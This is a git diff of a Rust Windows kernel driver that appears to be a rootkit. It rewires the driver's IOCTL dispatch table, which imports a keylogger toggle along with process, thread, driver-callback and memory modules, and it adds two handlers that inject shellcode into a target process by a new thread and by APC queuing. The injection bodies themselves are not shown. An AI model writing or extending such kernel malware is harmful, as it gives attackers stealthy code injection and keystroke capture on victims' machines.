@@ -1,20 +1,18 @@
 use {
-    crate::{
-        callbacks::Callback, driver::Driver, 
-        handle_callback, handle_driver, handle_injection, 
-        handle_module, handle_process, handle_thread, 
-        keylogger::set_keylogger_state, module::Module, 
-        process::Process, thread::Thread, injection::Injection
+    crate::{*,
+        callbacks::Callback, driver::Driver,
+        injection::InjectionShellcode, keylogger::set_keylogger_state, 
+        memory::Memory, module::Module, process::Process, thread::Thread
     }, 
     alloc::boxed::Box, 
     core::mem::size_of, 
     hashbrown::HashMap, 
     lazy_static::lazy_static, 
-    wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS},
     shared::{
         ioctls::*, 
         structs::*,
     }, 
+    wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS} 
 };
 
 #[cfg(not(feature = "mapper"))]
@@ -143,9 +141,16 @@ lazy_static! {
             status
         }) as IoctlHandler);
 
-        ioctls.insert(IOCTL_INJECTION, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-            log::info!("Received IOCTL_INJECTION");
-            let status = unsafe { handle_injection!(stack, Injection::injection_thread, TargetInjection) };
+        ioctls.insert(IOCTL_INJECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_INJECTION_THREAD");
+            let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_thread, TargetInjection) };
+            unsafe { (*irp).IoStatus.Information = 0 };
+            status
+        }) as IoctlHandler);
+
+        ioctls.insert(IOCTL_INJECTION_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_INJECTION_APC");
+            let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_apc, TargetInjection) };
             unsafe { (*irp).IoStatus.Information = 0 };
             status
         }) as IoctlHandler);
